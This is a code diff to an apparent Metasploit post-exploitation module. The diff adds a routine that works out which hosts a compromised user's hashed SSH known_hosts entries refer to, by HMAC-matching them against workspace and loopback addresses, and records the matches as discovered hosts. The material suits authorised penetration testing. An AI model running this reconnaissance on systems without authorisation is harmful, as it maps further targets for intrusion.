@@ -46,7 +46,8 @@ class MetasploitModule < Msf::Post
 
     register_options(
       [
-        OptBool.new('PARSE_KNOWN_HOSTS', [false, 'Parse plaintext known_hosts entries and store as workspace hosts', true])
+        OptBool.new('PARSE_KNOWN_HOSTS', [false, 'Parse plaintext known_hosts entries and store as workspace hosts', true]),
+        OptBool.new('CRACK_KNOWN_HOSTS', [false, 'Attempt to identify hashed known_hosts entries by checking against workspace hosts', true])
       ]
     )
   end
@@ -110,6 +111,7 @@ class MetasploitModule < Msf::Post
 
         if file == 'known_hosts'
           parse_known_hosts(data) if datastore['PARSE_KNOWN_HOSTS']
+          crack_hashed_known_hosts(data) if datastore['CRACK_KNOWN_HOSTS']
         else
           store_ssh_key(data, user, file)
         end
@@ -169,6 +171,37 @@ class MetasploitModule < Msf::Post
     end
 
     msg = "Parsed #{hosts_found} host #{'entry'.pluralize(hosts_found)} from known_hosts"
+    matched > 0 ? print_status(msg) : vprint_status(msg)
+  end
+
+  def crack_hashed_known_hosts(data)
+    return unless framework.db.active
+
+    candidates = framework.db.hosts(workspace: myworkspace).flat_map { |h| [h.address, h.name].compact }
+    candidates += LOOPBACK_ADDRS
+    candidates.uniq!
+
+    matched = 0
+    data.each_line do |line|
+      line.strip!
+      next unless line.start_with?('|1|')
+
+      _, _, salt_b64, hash_b64 = line.split(' ').first.split('|')
+      salt = Base64.decode64(salt_b64)
+
+      candidates.each do |host|
+        computed = Base64.strict_encode64(OpenSSL::HMAC.digest('SHA1', salt, host))
+        next unless computed == hash_b64
+
+        matched += 1
+
+        resolved = LOOPBACK_ADDRS.include?(host) ? session.session_host : host
+        vprint_good("Matched hashed known_hosts entry: #{host}#{" (#{resolved})" if resolved != host}")
+        report_host(host: resolved, info: 'Matched via hashed SSH known_hosts')
+      end
+    end
+
+    msg = "Matched #{matched} hashed #{'entry'.pluralize(matched)} against workspace hosts"
     matched > 0 ? print_status(msg) : vprint_status(msg)
   end
 end
